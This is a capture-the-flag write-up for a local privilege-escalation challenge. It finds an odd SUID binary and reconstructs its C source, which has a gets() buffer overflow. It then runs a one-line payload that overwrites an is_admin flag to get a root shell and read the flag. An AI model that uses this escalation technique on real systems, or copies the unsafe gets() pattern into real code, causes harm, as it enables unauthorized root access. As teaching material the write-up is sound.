# Can u ROOT me?

### Description

Download link: [google drive](https://drive.google.com/file/d/1EtJLxXDALXhJEVOx9yVtw4JuF-cMdUVQ/view?usp=sharing)

::: tip Creds
`ctfuser:ctfpassword`
:::

## Solution

The given virtual machine is only available using VMWare :(

Because we are given credentials we can just login

![can-u-root-me.png](/assets/ctf/dgactf/can-u-root-me.png)

No sudo
```bash
ctfuser@ubuntu-VMware-Virtual-Platform:~$ sudo -l
Sorry, user ctfuser may not run sudo on ubuntu-VMware-Virtual-Platform.
```

SUID files are not interesting, but some are odd
```bash
ctfuser@ubuntu-VMware-Virtual-Platform:~$ find / -perm -4000 -ls 2>/dev/null | grep -v /snap/
   525364     52 -rwsr-xr-x   1 root     root        51584 Jun  5  2025 /usr/bin/mount
   525436     64 -rwsr-xr-x   1 root     root        64152 May 30  2024 /usr/bin/passwd
   525684    272 -rwsr-xr-x   1 root     root       277936 Jun 25  2025 /usr/bin/sudo
   524892     72 -rwsr-xr-x   1 root     root        72792 May 30  2024 /usr/bin/chfn
   524898     44 -rwsr-xr-x   1 root     root        44760 May 30  2024 /usr/bin/chsh
   525059     40 -rwsr-xr-x   1 root     root        39296 Apr  8  2024 /usr/bin/fusermount3
   525683     56 -rwsr-xr-x   1 root     root        55680 Jun  5  2025 /usr/bin/su
   525384     40 -rwsr-xr-x   1 root     root        40664 May 30  2024 /usr/bin/newgrp
   525784     40 -rwsr-xr-x   1 root     root        39296 Jun  5  2025 /usr/bin/umount
   559218     16 -rwsr-xr-x   1 root     root        14656 Sep 23 20:03 /usr/bin/vmware-user-suid-wrapper
   525477     32 -rwsr-xr-x   1 root     root        30952 Dec  2  2024 /usr/bin/pkexec
   525116     76 -rwsr-xr-x   1 root     root        76248 May 30  2024 /usr/bin/gpasswd
   262179     20 -rwsr-xr-x   1 root     root        18136 Feb  4 19:40 /usr/local/bin/secure_login
   540842    412 -rwsr-xr--   1 root     dip        420416 Apr  3  2024 /usr/sbin/pppd
   527054     20 -rwsr-xr-x   1 root     root        18736 Dec  2  2024 /usr/lib/polkit-1/polkit-agent-helper-1
   524466     16 -rwsr-sr-x   1 root     root        14488 Oct 23 21:29 /usr/lib/xorg/Xorg.wrap
   527012    336 -rwsr-xr-x   1 root     root       342632 Jun  9  2025 /usr/lib/openssh/ssh-keysign
   526542     36 -rwsr-xr--   1 root     messagebus    34960 Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
   533711    160 -rwsr-xr-x   1 root     root         163112 May 21  2025 /usr/lib/snapd/snap-confine
```

`/usr/local/bin/secure_login` definitely odd ball 
```bash
ctfuser@ubuntu-VMware-Virtual-Platform:~$ strings /usr/local/bin/secure_login
/lib64/ld-linux-x86-64.so.2
puts
setgid
gets
setuid
system
__libc_start_main
printf
strcmp
libc.so.6
GLIBC_2.2.5
GLIBC_2.34
__gmon_start__
PTE1
H=H@@
=== Secure Login System ===
Username: 
Password: 
ctfuser
ctfpassword
Login successful
Admin access granted!
check /opt/ch4ll3ng3/
/bin/sh
User access only
GCC: (Ubuntu 13.3.0-6ubuntu2~24.04) 13.3.0
long long int
password
puts
...
```

```bash
ctfuser@ubuntu-VMware-Virtual-Platform:~$ ls /opt/ch4ll3ng3/ -alh
total 12K
drwxr-xr-x 2 root root 4.0K Feb  4 19:46 .
drwxr-xr-x 3 root root 4.0K Feb  4 19:44 ..
-rw-r----- 1 root root   34 Feb  4 19:46 real_fl4g.txt 
```

Very simple buffer overflow, we just need to set `is_admin` to 1 and that should be enough to become `root`

![can-u-root-me-1.png](/assets/ctf/dgactf/can-u-root-me-1.png)

- [https://dogbolt.org/?id=ad227a9d-4613-431f-a7c0-d36c35d4c973#Hex-Rays=199](https://dogbolt.org/?id=ad227a9d-4613-431f-a7c0-d36c35d4c973#Hex-Rays=199)

The original code is basically this
```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

typedef struct {
    char username[32];
    char password[32];
    int is_admin;
} session_t;

void banner() {
    puts("=== Secure Login System ===");
}

int main() {
    session_t session;
    session.is_admin = 0;

    banner();

    printf("Username: ");
    gets(session.username);

    printf("Password: ");
    gets(session.password);

    if (strcmp(session.username, "ctfuser") == 0 && strcmp(session.password, "ctfpassword") == 0)
        puts("Login successful");

    if (session.is_admin == 1) {
        puts("Admin access granted!");
        puts("check /opt/ch4ll3ng3/");
        setuid(0);
        setgid(0);
        system("/bin/sh");
    } else {
        puts("User access only");
    }

    return 0;
}
```

The struct layout on the stack (80 bytes total):
```
Offset 0x00  [32 bytes] username
Offset 0x20  [32 bytes] password
Offset 0x40  [ 4 bytes] is_admin
             [ 4 bytes] padding (alignment)
─────────────────────────
Total: 0x50 = 80 bytes
```

What gets does: reads input with zero bounds checking, it just keeps writing bytes into memory until it hits a newline or EOF.

Payload breakdown:
```python
b"ctfuser\n"                                          ← written into username by first  gets()
b"ctfpassword\x00" + b"A"*20 + b"\x01\x00\x00\x00\n"  ← written into password by second gets()
```

The second gets() writes starting at password (offset 0x20):

| Bytes                  | Count    | What it fills                                                             |
| ---------------------- | -------- | ------------------------------------------------------------------------- |
| ctfpassword\x00        | 12 bytes | password[0..11] - the null byte terminates the string for strcmp          |
| AAAAAAAAAAAAAAAAAAAAAA | 20 bytes | password[12..31] - fills the rest of the 32-byte password buffer          |
| \x01\x00\x00\x00       | 4 bytes  | overflows directly into is_admin, setting it to integer 1 (little-endian) |

12 + 20 + 4 = 36 bytes, 32 fill the password buffer exactly, then 4 overflow into is_admin.

```bash
ctfuser@ubuntu-VMware-Virtual-Platform:~$ (python3 -c 'import sys; sys.stdout.buffer.write(b"ctfuser\n" + b"ctfpassword\x00" + b"A"*20 + b"\x01\x00\x00\x00\n")'; cat) | /usr/local/bin/secure_login
=== Secure Login System ===
Username: Password: Login successful
Admin access granted!
check /opt/ch4ll3ng3/
> id
uid=0(root) gid=0(root) groups=0(root),1001(ctfuser)
> cat /opt/ch4ll3ng3/real_fl4g.txt
DGA{pwn3d_5u1d_b1n4ry_l1k3_4_pro}
```

::: tip Flag
`DGA{pwn3d_5u1d_b1n4ry_l1k3_4_pro}`
:::

